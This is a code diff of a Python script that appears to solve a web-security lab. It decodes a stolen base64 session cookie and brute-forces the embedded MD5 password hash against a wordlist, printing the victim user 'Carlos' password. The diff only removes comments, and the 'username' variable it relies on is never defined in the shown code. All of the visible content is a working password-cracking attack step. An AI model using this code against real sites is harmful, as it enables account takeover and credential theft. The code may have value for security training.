@@ -25,7 +25,7 @@ def cookie(exploit_url, s):
 def crack_the_password(exploit_url, s):
     time.sleep(1)
     cookies = cookie(exploit_url, s).strip(' ')
-    decoded_cookie = base64.b64decode(cookies).decode('utf-8')  # Decoding with correct encoding
+    decoded_cookie = base64.b64decode(cookies).decode('utf-8')
     print(Fore.GREEN + f'[+] Password: {decoded_cookie}\n'+Fore.YELLOW+'[+] You can crack the password hash online')
     ans = input(Fore.YELLOW + f'[!] OR, using a wordlist to crack it offline? [Y] or [N]: ')
     if ans.lower() == 'y':
@@ -36,9 +36,9 @@ def crack_the_password(exploit_url, s):
             with open(wordlist, 'r', encoding='utf-8', errors='ignore') as file:
                 passwords = file.readlines()
             for password in passwords:
-                password = password.strip()  # Remove trailing newline characters
+                password = password.strip() 
                 hashed_password = hashlib.md5(password.encode()).hexdigest()
-                session_data = f'{username}:{hashed_password}'  # Assuming username is defined somewhere
+                session_data = f'{username}:{hashed_password}'
                 hashed = base64.b64encode(session_data.encode()).decode()
                 if decoded_cookie == hashed:
                     print(Fore.GREEN + f'[+] Carlos password is: {password}')
